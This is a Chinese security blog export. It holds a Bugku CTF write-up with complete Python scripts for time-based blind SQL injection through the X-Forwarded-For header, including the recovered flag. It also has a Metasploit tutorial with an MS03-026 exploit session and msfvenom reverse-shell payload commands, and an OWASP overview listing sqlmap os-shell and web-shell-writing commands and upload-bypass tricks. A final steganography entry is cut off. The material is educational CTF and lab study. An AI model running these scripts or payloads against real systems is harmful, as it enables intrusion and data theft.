<h4 id="题目直接给出了源码，那就很简单了"><a href="#题目直接给出了源码，那就很简单了" class="headerlink" title="题目直接给出了源码，那就很简单了"></a>题目直接给出了源码，那就很简单了</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getIp</span><span class="params">()</span></span>&#123;</span><br><span class="line">$ip = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]))&#123;</span><br><span class="line">$ip = $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$ip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">&#125;</span><br><span class="line">$ip_arr = explode(<span class="string">','</span>, $ip);</span><br><span class="line"><span class="keyword">return</span> $ip_arr[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$host=<span class="string">"localhost"</span>;</span><br><span class="line">$user=<span class="string">""</span>;</span><br><span class="line">$pass=<span class="string">""</span>;</span><br><span class="line">$db=<span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">$connect = mysql_connect($host, $user, $pass) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to connect"</span>);</span><br><span class="line"></span><br><span class="line">mysql_select_db($db) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to select database"</span>);</span><br><span class="line"></span><br><span class="line">$ip = getIp();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'your ip is :'</span>.$ip;</span><br><span class="line">$sql=<span class="string">"insert into client_ip (ip) values ('$ip')"</span>;</span><br><span class="line">mysql_query($sql);</span><br></pre></td></tr></table></figure></div>
<p>简单分析可以看出服务器读取http头部x-forwarded-for作为ip地址，在将其传给$ip之前，以  ， 为分割符进行分割并取结果数组的第一项。相当于过滤了逗号     </p>
<p>因为error_reporting(0);关闭了错误报告，没有有效回显，所以使用sleep()时间盲注。    </p>
<p>构造payload：       </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LSL"><figure class="iseeu highlight /lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>'+sleep(<span class="number">5</span>)+'</span><br></pre></td></tr></table></figure></div>

<p>这道题过滤了 ， 所以脚本如下：</p>
<p>查库查表</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">dic= string.ascii_letters + string.digits + string.punctuation    #猜解数据库名称的payload</span><br><span class="line"><span class="comment">#string.ascii_leters生成所有字母A-Z,a-z.</span></span><br><span class="line"><span class="comment">#string.ascii_digits生成所有数字0-9</span></span><br><span class="line"><span class="comment">#string.punctuation生成所有标点字符  '!"#$%&amp;\'()*+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~'</span></span><br><span class="line">payload_db = <span class="string">"1'+(case when (substr(database() from &#123;0&#125; for 1)='&#123;1&#125;') then sleep(5) else 1 end)+'"</span> #查询当前数据库名</span><br><span class="line">payload_tb_num = <span class="string">"1'+(select case when (select count(*) from information_schema.TABLES where TABLE_SCHEMA='&#123;0&#125;')='&#123;1&#125;' then sleep(5) else 1 end)+'1"</span> #查询数据库表总数</span><br><span class="line">payload_tb_name_len = <span class="string">"1'+(select case when (select length(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA='&#123;0&#125;' limit 1 offset &#123;1&#125;) = '&#123;2&#125;' then sleep(5) else 1 end)+'1"</span>#查询数据表长度</span><br><span class="line">payload_tb_name = <span class="string">"1'+(select case when (substr((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA='&#123;0&#125;' limit 1 offset &#123;1&#125;) from &#123;2&#125; for 1)) = '&#123;3&#125;' then sleep(5) else 1 end)+'1"</span>#查询数据表名</span><br><span class="line">payload_col_num = <span class="string">"1'+(select case when (select count(*) from  ))"</span></span><br><span class="line"><span class="comment">#查当前数据库</span></span><br><span class="line">db_name = <span class="string">''</span></span><br><span class="line">url = <span class="string">"http://123.206.87.240:8002/web15/"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(1,6):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">        try:</span><br><span class="line">            headers = &#123;<span class="string">'x-forwarded-for'</span>:payload_db.format(i,j)&#125;</span><br><span class="line">            res = requests.<span class="builtin-name">get</span>(url,<span class="attribute">headers</span>=headers,timeout=4)</span><br><span class="line">        except requests.exceptions.ReadTimeout:  #服务器在指定时间内没有应答</span><br><span class="line">            <span class="builtin-name">print</span>(payload_db.format(i,j))</span><br><span class="line">            db_name += j</span><br><span class="line">            break</span><br><span class="line"><span class="builtin-name">print</span>(<span class="string">'db_name: '</span> + db_name)</span><br><span class="line"><span class="comment">#查当前数据库有几张表</span></span><br><span class="line">tb_num = 0</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(1,50):</span><br><span class="line">    try:</span><br><span class="line">        headers = &#123;<span class="string">'x-forwarded-for'</span>:payload_tb_num.format(db_name,str(i))&#125;</span><br><span class="line">        res = requests.<span class="builtin-name">get</span>(url,<span class="attribute">headers</span>=headers,timeout=4)</span><br><span class="line">    except requests.exceptions.ReadTimeout:</span><br><span class="line">        tb_num = i</span><br><span class="line">        <span class="builtin-name">print</span>(<span class="string">'tb_num: '</span>+str(i))</span><br><span class="line">        break</span><br><span class="line"><span class="comment">#运行后可知有两个表</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#表名破解</span></span><br><span class="line">len = 0</span><br><span class="line"><span class="comment">#爆破表的长度</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(tb_num):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(50):</span><br><span class="line">        try:</span><br><span class="line">            headers = &#123;<span class="string">'x-forwarded-for'</span>:payload_tb_name_len.format(db_name,i,j)&#125;</span><br><span class="line">            res = requests.<span class="builtin-name">get</span>(url,<span class="attribute">headers</span>=headers,timeout=5)</span><br><span class="line">        except requests.exceptions.ReadTimeout:</span><br><span class="line">            len = j</span><br><span class="line">            break</span><br><span class="line">    <span class="builtin-name">print</span>(<span class="string">'No.'</span>+str(i+1)+<span class="string">' table has length: '</span> + str(len))</span><br><span class="line">    #爆破 表名</span><br><span class="line">    tb_name = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> range(1,len + 1):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">            try:</span><br><span class="line">                headers = &#123;<span class="string">'x-forwarded-for'</span>:payload_tb_name.format(db_name,i,k,j)&#125;</span><br><span class="line">                res = requests.<span class="builtin-name">get</span>(url,<span class="attribute">headers</span>=headers,timeout=5)</span><br><span class="line">            except requests.exceptions.ReadTimeout:</span><br><span class="line">                <span class="builtin-name">print</span>(payload_tb_name.format(db_name,i,k,j))</span><br><span class="line">                tb_name += j</span><br><span class="line">                break</span><br><span class="line">        <span class="builtin-name">print</span>(tb_name)</span><br><span class="line"><span class="comment">#运行后可知两个表为flag和client_ip</span></span><br></pre></td></tr></table></figure></div>

<p>查字段：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"><span class="comment">#数据库</span></span><br><span class="line">db_name='web15'</span><br><span class="line"><span class="comment">#数据表</span></span><br><span class="line">tb_name='flag'</span><br><span class="line">url = "http://123.206.87.240:8002/web15/"</span><br><span class="line">payload_col_num = "1'+(<span class="keyword">select</span> <span class="keyword">case</span> <span class="keyword">when</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> information_schema.COLUMNS <span class="keyword">where</span> TABLE_SCHEMA=<span class="string">'&#123;0&#125;'</span> <span class="keyword">and</span> TABLE_NAME=<span class="string">'&#123;1&#125;'</span>)=&#123;<span class="number">2</span>&#125; <span class="keyword">then</span> <span class="keyword">sleep</span>(<span class="number">5</span>) <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">end</span>)+<span class="string">'" #爆字段数</span></span><br><span class="line"><span class="string">payload_col_len = "1'</span>+(<span class="keyword">select</span> <span class="keyword">case</span> <span class="keyword">when</span> (<span class="keyword">select</span> <span class="keyword">length</span>(COLUMN_NAME) <span class="keyword">from</span> information_schema.COLUMNS <span class="keyword">WHERE</span> TABLE_SCHEMA=<span class="string">'&#123;0&#125;'</span> <span class="keyword">and</span> TABLE_NAME=<span class="string">'&#123;1&#125;'</span> <span class="keyword">limit</span> <span class="number">1</span> <span class="keyword">offset</span> &#123;<span class="number">2</span>&#125;) = <span class="string">'&#123;3&#125;'</span> <span class="keyword">then</span> <span class="keyword">sleep</span>(<span class="number">6</span>) <span class="keyword">else</span> <span class="number">1</span> <span class="keyword">end</span>)+<span class="string">'"</span></span><br><span class="line"><span class="string">payload_col_name = "1'</span>+(<span class="keyword">select</span> <span class="keyword">case</span> <span class="keyword">when</span> (<span class="keyword">substr</span>((<span class="keyword">select</span> COLUMN_NAME <span class="keyword">FROM</span> information_schema.COLUMNS <span class="keyword">WHERE</span> TABLE_SCHEMA=<span class="string">'&#123;0&#125;'</span> <span class="keyword">and</span> TABLE_NAME=<span class="string">'&#123;1&#125;'</span> <span class="keyword">limit</span> <span class="number">1</span> <span class="keyword">offset</span> &#123;<span class="number">2</span>&#125;) <span class="keyword">from</span> &#123;<span class="number">3</span>&#125; <span class="keyword">for</span> <span class="number">1</span>)) = <span class="string">'&#123;4&#125;'</span> <span class="keyword">then</span> <span class="keyword">sleep</span>(<span class="number">6</span>) <span class="keyword">else</span> <span class="number">1</span> <span class="keyword">end</span>)+<span class="string">'"</span></span><br><span class="line"><span class="string">dic='</span><span class="number">0123456789</span>abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUZWXYZ_&#123;&#125;<span class="string">'</span></span><br><span class="line"><span class="string">#查flag表字段数</span></span><br><span class="line"><span class="string">col_num = 0</span></span><br><span class="line"><span class="string">for a in range(1,10):</span></span><br><span class="line"><span class="string">    try:</span></span><br><span class="line"><span class="string">        headers = &#123;'</span>x-forwarded-<span class="keyword">for</span><span class="string">':payload_col_num.format(db_name,tb_name,a)&#125;</span></span><br><span class="line"><span class="string">        res = requests.get(url,headers=headers,timeout=5)</span></span><br><span class="line"><span class="string">    except requests.exceptions.ReadTimeout:</span></span><br><span class="line"><span class="string">        col_num  = a</span></span><br><span class="line"><span class="string">        print ('</span>flag表<span class="string">'+"字段总数为"+str(col_num))</span></span><br><span class="line"><span class="string">        break</span></span><br><span class="line"><span class="string">#查flag表字段长度</span></span><br><span class="line"><span class="string">col_len = 0</span></span><br><span class="line"><span class="string">col_name=''</span></span><br><span class="line"><span class="string">for b in range(col_num):</span></span><br><span class="line"><span class="string">    for c in range(50):</span></span><br><span class="line"><span class="string">        try:</span></span><br><span class="line"><span class="string">            headers = &#123;'</span>x-forwarded-<span class="keyword">for</span><span class="string">':payload_col_len.format(db_name,tb_name,b,c)&#125;</span></span><br><span class="line"><span class="string">            res = requests.get(url,headers=headers,timeout=5)</span></span><br><span class="line"><span class="string">        except requests.exceptions.ReadTimeout:</span></span><br><span class="line"><span class="string">            col_len = c</span></span><br><span class="line"><span class="string">            print('</span>No.<span class="string">' + str(b + 1) + '</span> <span class="keyword">column</span> has <span class="keyword">length</span>: <span class="string">' + str(col_len))</span></span><br><span class="line"><span class="string">            break</span></span><br><span class="line"><span class="string">#查字段名</span></span><br><span class="line"><span class="string">    for d in range(1, col_len + 1):</span></span><br><span class="line"><span class="string">        for e in dic:</span></span><br><span class="line"><span class="string">            try:</span></span><br><span class="line"><span class="string">                headers = &#123;'</span>x-forwarded-<span class="keyword">for</span><span class="string">': payload_col_name.format(db_name, tb_name, b, d, e)&#125;</span></span><br><span class="line"><span class="string">                res = requests.get(url, headers=headers, timeout=5)</span></span><br><span class="line"><span class="string">            except requests.exceptions.ReadTimeout:</span></span><br><span class="line"><span class="string">                col_name += e</span></span><br><span class="line"><span class="string">                print("col_name="+col_name)</span></span><br><span class="line"><span class="string">                break</span></span><br><span class="line"><span class="string">print('</span>col_name: <span class="string">' + col_name)</span></span><br></pre></td></tr></table></figure></div>

<p>查数据</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line"><span class="attribute">dic</span>=<span class="string">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUZWXYZ_&#123;&#125;'</span></span><br><span class="line">url = <span class="string">"http://123.206.87.240:8002/web15/"</span></span><br><span class="line"><span class="comment">#get content 猜解flag</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">payload_data = <span class="string">"1'+(select case when (substr((select flag from flag) from &#123;0&#125; for 1)) = '&#123;1&#125;' then sleep(6) else 1 end)+'1"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(1,50):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">        try:</span><br><span class="line">            headers = &#123;<span class="string">'x-forwarded-for'</span>:payload_data.format(i,j)&#125;</span><br><span class="line">            res = requests.<span class="builtin-name">get</span>(url,<span class="attribute">headers</span>=headers,timeout=5)</span><br><span class="line">        except requests.exceptions.ReadTimeout:</span><br><span class="line">            <span class="builtin-name">print</span>(payload_data.format(i,j))</span><br><span class="line">            flag += j</span><br><span class="line">            break</span><br><span class="line">    <span class="builtin-name">print</span>(<span class="string">'data='</span>+str(flag))</span><br></pre></td></tr></table></figure></div>

<p>得到flag</p>
<p>flag{cdbf14c9551d5be5612f7bb5d2867853}</p>
]]></content>
      <categories>
        <category>bugku靶场</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入 | CTF | SQL注入脚本</tag>
      </tags>
  </entry>
  <entry>
    <title>MSF--Metasploit Framework渗透测试工具</title>
    <url>/undefined/MSF--Metasploit%20Framework%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[<p>目前最流行、最强大、最具扩展性的渗透测试平台软件    </p>
<p>2003年由HD More发布第一版，2007年用ruby语言重写，MSF默认集成在Kali Linux之中    </p>
<p>Kali左侧有MSF的快捷方式，可以直接点击使用，也可以在终端输入msfconsole启动MSF </p>
<h2 id="一-名词解释"><a href="#一-名词解释" class="headerlink" title="一.名词解释"></a>一.名词解释</h2><h3 id="exploits"><a href="#exploits" class="headerlink" title="exploits"></a>exploits</h3><p>漏洞利用模块，这个模块通常是用于对某些有可能存在漏洞的目标进行漏洞利用。   </p>
<h3 id="payloads"><a href="#payloads" class="headerlink" title="payloads"></a>payloads</h3><p>简单来说，Payload是黑客用来与被黑了的系统交互的简单脚本。使用payload，可以将数据传输到已经沦陷的系统。   </p>
<p>Metasploit有效载荷可以有三种类型-    </p>
<ul>
<li><p>Singles<br>Singles非常小，旨在建立某种通讯，然后进入下一阶段。例如，只是创建一个用户。   </p>
</li>
<li><p>Staged<br>是一种攻击者用来将更大的文件上传到沦陷的系统的payload。   </p>
</li>
<li><p>Stages<br>Stages是由Stagers模块下载的payload组件。各种payload stages提供高级功能，没有规模限制，如Meterpreter和VNCInjection。    </p>
</li>
</ul>
<h3 id="auxiliary"><a href="#auxiliary" class="headerlink" title="auxiliary"></a>auxiliary</h3><p>负责执行信息收集、扫描、嗅探、指纹识别、口令猜测和Dos攻击等功能的辅助模块     </p>
<h4 id="例子："><a href="#例子：" class="headerlink" title="例子："></a>例子：</h4><p>让我们举个例子来理解Metasploitpayload的使用。假设我们有一台易受DCOM MS03-026攻击的WindowsServer 2003计算机。</p>
<p>首先，我们将搜索可以使用此漏洞的exp。我们将使用具有最佳RANK的漏洞利用。 </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="EXCEL"><figure class="iseeu highlight /excel"><table><tr><td class="code"><pre><span class="line">msf5 &gt; <span class="built_in">search</span> dcom</span><br></pre></td></tr></table></figure></div>
<p><img src="https://i.imgur.com/k3zDoiw.png" alt="">    </p>
<p>再选择要使用的exp   </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ACTIONSCRIPT"><figure class="iseeu highlight /actionscript"><table><tr><td class="code"><pre><span class="line">msf5 &gt; <span class="keyword">use</span> exploit/windows/dcerpc/ms03_026_dcom</span><br></pre></td></tr></table></figure></div>
<img src="https://i.imgur.com/TBnDynz.png">  

<p>然后我们使用下列命令来看看我们可以使用的payload     </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LISP"><figure class="iseeu highlight /lisp"><table><tr><td class="code"><pre><span class="line">msf5 exploit(<span class="name">windows/dcerpc/ms03_026_dcom</span>) &gt; show payloads</span><br></pre></td></tr></table></figure></div>
<img src="https://i.imgur.com/k3zDoiw.png">   

<p>看到列出的payload可以能帮助我们上传/执行文件，使沦陷的系统成为vnc服务器（能远程监视）   </p>
<img src="https://i.imgur.com/7q6OI0e.png">  

<p>为了设置我们需要的payload，选择一个payload使用下列命令      </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GAMS"><figure class="iseeu highlight /gams"><table><tr><td class="code"><pre><span class="line">msf5 exploit(windows/dcerpc/ms03_026_dcom) &gt; <span class="keyword">set</span> PAYLOAD <span class="comment">windows</span>/upexec/<span class="comment">bind_hidden_tcp</span></span><br></pre></td></tr></table></figure></div>
<img src="https://i.imgur.com/Q3bStZQ.png">   

<p>设置监听主机和监听端口(LHOST,LPORT),它们是攻击者的IP和端口。然后设置远程主机和端口(RPORT,LHOST),它们是受害者IP和端口。    </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ANGELSCRIPT"><figure class="iseeu highlight /angelscript"><table><tr><td class="code"><pre><span class="line">msf5 exploit(windows/dcerpc/ms03_026_dcom) &gt; <span class="keyword">set</span> LHOST <span class="number">192.168</span><span class="number">.56</span><span class="number">.134</span></span><br><span class="line">LHOST =&gt; <span class="number">192.168</span><span class="number">.56</span><span class="number">.134</span></span><br><span class="line">msf5 exploit(windows/dcerpc/ms03_026_dcom) &gt; <span class="keyword">set</span> LPORT <span class="number">23524</span></span><br><span class="line">LPORT =&gt; <span class="number">23524</span></span><br><span class="line">msf5 exploit(windows/dcerpc/ms03_026_dcom) &gt; <span class="keyword">set</span> RPORT <span class="number">135</span></span><br><span class="line">RPORT =&gt; <span class="number">135</span></span><br><span class="line">msf5 exploit(windows/dcerpc/ms03_026_dcom) &gt; <span class="keyword">set</span> RHOST <span class="number">192.168</span><span class="number">.56</span><span class="number">.146</span></span><br><span class="line">RHOST =&gt; <span class="number">192.168</span><span class="number">.56</span><span class="number">.146</span></span><br><span class="line">msf5 exploit(windows/dcerpc/ms03_026_dcom) &gt;</span><br></pre></td></tr></table></figure></div>
<img src="https://i.imgur.com/U6NHEVX.png">

<p>输入“exploit”就会创建会话    </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LISP"><figure class="iseeu highlight /lisp"><table><tr><td class="code"><pre><span class="line">msf5 exploit(<span class="name">windows/dcerpc/ms03_026_dcom</span>) &gt; exploit</span><br></pre></td></tr></table></figure></div>

<p>这里因为我使用的windows 2003 已经有该漏洞的补丁了，所以利用失败了</p>
<h4 id="原文链接："><a href="#原文链接：" class="headerlink" title="原文链接："></a>原文链接：</h4><p><a href="https://www.tutorialspoint.com/metasploit/metasploit_payload.htm" target="_blank" rel="noopener">https://www.tutorialspoint.com/metasploit/metasploit_payload.htm</a></p>
<h3 id="2、HowPayloads-Work"><a href="#2、HowPayloads-Work" class="headerlink" title="2、HowPayloads Work"></a>2、HowPayloads Work</h3><p>payload模块位于modules/payloads/{singles,stages,stagers}/<platform>&gt;。</p>
<p>当框架启动时，stages与stagers结合以创建可在漏洞利用中使用的完整的payload。然后，handlers与payload配对，因此框架将知道如何使用给定的通信机制创建会话。</p>
<p>Payload被赋予参考名称，如下所示：</p>
<p>Staged payloads：<platform>/ [arch] / <stage> / <stager></p>
<p>Single payloads：<platform>/ [arch] / <single></p>
<p>这会产生像windows/ x64 / meterpreter / reverse_tcp这样的payload。平台是windows，架构是x64，我们提供的最终的stage是meterpreter，而传递它的stager是reverse_tcp。</p>
<p>请注意，arch是可选的，因为在某些情况下，它是不必要或者已经默认了。比如php/ meterpreter / reverse_tcp。PHP的payload不需要Arch，因为我们提供的是解释代码而不是二进制代码。</p>
<p>Singles</p>
<p>Singlepayload发射后就不管了（就像发射x级火箭一样）。它们可以与Metasploit建立沟通机制，但没有必要。你可能会需要singlepayload的场景就是目标没有接入网络，此时仍然可以通过USB密钥提供文件格式攻击。</p>
<p>Stagers</p>
<p>Stagers是一个小发射器（同样以火箭发射作比喻），旨在创建某种形式的通信，然后将执行传递到下一个阶段。使用stager解决了两个问题。首先，它允许我们最初使用较小的有效负载来加载具有更多功能的较大的payload。其次，它使通信机制与最终阶段分离成为可能，因此一个payload无需复制代码就可以与多个传输一起使用。</p>
<p>Stages</p>
<p>由于stager通过为我们分配大量内存来介意任何大小限制问题，因此stages可以任意大。它的优点之一是能够以更高级别的语言（如C语言）编写最终阶段的payload。</p>
<p>DeliveringStages</p>
<p>你希望payload连接回来的IP地址和端口被嵌入到stager中。如上所述，所有staged payload仅仅是建立通信并执行下一阶段的小推进器。当使用staged payload创建可执行文件时，实际上只是创建了stager。所以以下命令将创建功能相同的exe文件：</p>
<p>msfvenom-f exe LHOST=192.168.1.1 -p windows/meterpreter/reverse_tcp</p>
<p>msfvenom-f exe LHOST=192.168.1.1 -p windows/shell/reverse_tcp</p>
<p>msfvenom-f exe LHOST=192.168.1.1 -p windows/vncinject/reverse_tcp</p>
<p>（请注意，它们在功能上是相同的- 但是由于其中有很多随机化，因此没有两个可执行文件是完全相同的）</p>
<p>无论使用stager设置的哪种传输机制（例如：tcp，http，https），Ruby端都是充当客户端。</p>
<p>对于shell阶段，Metasploit会在你与其进行交互时将远程进程的标准输入输出连接到你的终端。</p>
<p>在Meterpreter阶段的情况下，Metasploit将开始使用Meterpreterwire协议。</p>
<h4 id="原文："><a href="#原文：" class="headerlink" title="原文："></a>原文：</h4><p><a href="https://github.com/rapid7/metasploit-framework/wiki/How-payloads-work" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework/wiki/How-payloads-work</a></p>
]]></content>
      <categories>
        <category>渗透测试</category>
        <category>工具</category>
      </categories>
      <tags>
        <tag>MSF</tag>
      </tags>
  </entry>
  <entry>
    <title>ISCC | Where is file?</title>
    <url>/undefined/%5BISCC%5DWhere%20is%20file/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>WEB漏洞</category>
        <category>文件包含</category>
      </categories>
      <tags>
        <tag>文件包含 | PHP伪协议</tag>
      </tags>
  </entry>
  <entry>
    <title>web应用安全概述</title>
    <url>/undefined/web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E6%A6%82%E8%BF%B0/</url>
    <content><![CDATA[<h3 id="OWASP-开放的web应用程序安全项目组织"><a href="#OWASP-开放的web应用程序安全项目组织" class="headerlink" title="OWASP(开放的web应用程序安全项目组织)"></a>OWASP(开放的web应用程序安全项目组织)</h3><p>OWASP TOP10（10大应用安全风险）</p>
<ul>
<li>1.注入</li>
<li>2.失效的身份认证和会话管理</li>
<li>3.XSS</li>
<li>4.不安全的对象直接引用</li>
<li>5.CSRF</li>
<li>6.安全的错误配置</li>
<li>7.限制URL访问失败</li>
<li>8.未验证的重定向转发</li>
<li>9.应用已知的漏洞组件</li>
<li>10.敏感信息泄露<h4 id="一-SQL-注入漏洞"><a href="#一-SQL-注入漏洞" class="headerlink" title="一.SQL 注入漏洞"></a>一.SQL 注入漏洞</h4><h5 id="1-原理"><a href="#1-原理" class="headerlink" title="1.原理"></a>1.原理</h5><h5 id="2-流程"><a href="#2-流程" class="headerlink" title="2.流程"></a>2.流程</h5>注入点探测   </li>
</ul>
<p>自动探测：web漏扫工具，AWS，APPSCAN，openVAS,nessus，OWASPZAP,Burpsuit   </p>
<p>手工方式： 手工构造payload   </p>
<p>信息获取   </p>
<p>环境信息：数据库的类型，版本，操作系统版本，用户信息</p>
<p>数据库的信息：库名，表名，字段名，数据值（管理员账户密码）</p>
<p>获取权限</p>
<p>获取操作系统权限，通过执行shell，上传大马或者小马</p>
<h5 id="3-sqlmap"><a href="#3-sqlmap" class="headerlink" title="3.sqlmap"></a>3.sqlmap</h5><p>5中注入类型：盲注，联合注入，二次注入，堆叠注入，报错注入</p>
<p>整型<br>$ =”select * from users where name = $name and pass = $pass”;<br>$ =”select * from users where name = or 1=1 # and pass = $pass”;<br>等价select * from users;</p>
<p>字符型<br>$ = “select * from users where name = ‘$name’ and pass =  “$pass””;<br>$ = “select * from users where name = ‘’ or ‘1’=’1’# and pass =  “$pass””;</p>
<p>搜索型<br>$ = “select * from users where password like ‘%$pwd%’  order by password”;<br>$ = “select * from users where password like ‘%’ 1=1 and ‘%’=’%’  order by password”;   </p>
<p>sqlmap用法   </p>
<p>sqlmap -u url地址/参数=值 –dbs<br>sqlmap -u url地址/参数=值 –os-shell———————//拿系统shell<br>sqlmap -u url地址/参数=值 –level 5 –risk=4————-//设置安全级别，风险级别<br>sqlmap -u url地址/参数=值 –file-read”c:\1.sh”———–//读取文件<br>sqlmap -u url地址/参数=值 –file-wirte shell.php –file-dest”C:\www\xxx” ———-//写shell<br>sqlmap -u url地址/参数=值</p>
<h5 id="4-建议下载安全狗-设置绕过练习"><a href="#4-建议下载安全狗-设置绕过练习" class="headerlink" title="4.建议下载安全狗,设置绕过练习"></a>4.建议下载安全狗,设置绕过练习</h5><p>tyamper脚本 python 基础编程，协议分析，数据库语法及编程,SQL注入漏洞原理</p>
<h4 id="二-XSS漏洞"><a href="#二-XSS漏洞" class="headerlink" title="二.XSS漏洞"></a>二.XSS漏洞</h4><h4 id="三-上传漏洞"><a href="#三-上传漏洞" class="headerlink" title="三.上传漏洞"></a>三.上传漏洞</h4><p>上传绕过：   </p>
<h5 id="1-客户端：js检查"><a href="#1-客户端：js检查" class="headerlink" title="1.客户端：js检查"></a>1.客户端：js检查</h5><h5 id="2-服务端："><a href="#2-服务端：" class="headerlink" title="2.服务端："></a>2.服务端：</h5><p>检查后缀：   </p>
<ul>
<li>黑名单：可解析的后缀.php .xxx丶上传伪静态文件（.htaccess）丶点绕过，空格绕过丶;;$DATA绕过 </li>
<li>白名单：%00截断丶0x00截断丶MIME绕过</li>
</ul>
<p>检查内容：文件头丶突破getimagesize()丶二次渲染<br>代码逻辑：条件竞争</p>
<h4 id="四-CSRF"><a href="#四-CSRF" class="headerlink" title="四.CSRF"></a>四.CSRF</h4><h4 id="五-SSRF"><a href="#五-SSRF" class="headerlink" title="五.SSRF"></a>五.SSRF</h4><p>服务端请求伪造</p>
<h4 id="六-暴力破解漏洞"><a href="#六-暴力破解漏洞" class="headerlink" title="六.暴力破解漏洞"></a>六.暴力破解漏洞</h4><p>账户密码 静态验证码<br>Hydra–九头蛇(ftp.ssh.telnet.mysql等)<br>Burpsuit 测试器 4种</p>
<h4 id="七-命令执行漏洞"><a href="#七-命令执行漏洞" class="headerlink" title="七.命令执行漏洞"></a>七.命令执行漏洞</h4><p>程序调用系统的函数，php，哪些函数会调用：<br>system()<br>exec:<br>shell_exec:<br>等<br>1.远程命令执行漏洞<br>eval()<br>assert()<br>preg_repalce()<br>2.本地命令执行漏洞<br>system()<br>exec()<br>shell_exec()   </p>
<h4 id="八-包含漏洞"><a href="#八-包含漏洞" class="headerlink" title="八.包含漏洞"></a>八.包含漏洞</h4><p>include()<br>include_once()<br>require()<br>require_once()   </p>
<h4 id="九-XXE漏洞"><a href="#九-XXE漏洞" class="headerlink" title="九.XXE漏洞"></a>九.XXE漏洞</h4><p>XML基础知识<br>危害：<br>读取任意文件<br>执行系统指令<br>探测内网端口<br>攻击内网网站</p>
<h4 id="十-反序列化漏洞"><a href="#十-反序列化漏洞" class="headerlink" title="十.反序列化漏洞"></a>十.反序列化漏洞</h4>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>ISCC | 是我DIO哒</title>
    <url>/undefined/%5BISCC%5D%E6%98%AF%E6%88%91DIO%E5%93%92/</url>
    <content><![CDATA[<p><img src="https://i.imgur.com/pcz4stw.png" alt="">   </p>
<p>首先下载得到图片   </p>
<p><img src="https://i.imgur.com/noZWCEy.png" alt=""></p>
<p>很骚气   </p>
<p>首先常规操作查看属性详细信息，改成txt后缀啥的，用Stegsolve都没有啥发现。然后还是二话不说binwalk上手。   </p>
<p><img src="https://i.imgur.com/DxYT4wO.png" alt="">    </p>
